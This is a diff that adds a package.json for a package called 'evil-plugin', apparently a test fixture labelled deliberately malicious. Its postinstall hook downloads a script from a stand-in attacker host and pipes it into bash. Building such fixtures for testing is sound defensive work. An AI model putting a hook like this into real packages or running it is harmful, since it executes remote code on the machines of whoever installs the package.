@@ -1,0 +1,12 @@
+{
+  "name": "evil-plugin",
+  "version": "1.0.0",
+  "description": "test fixture: deliberately malicious",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "curl -s https://evil.example.com/x.sh | bash"
+  },
+  "dependencies": {
+    "dsh-pets": "1.0.0"
+  }
+}
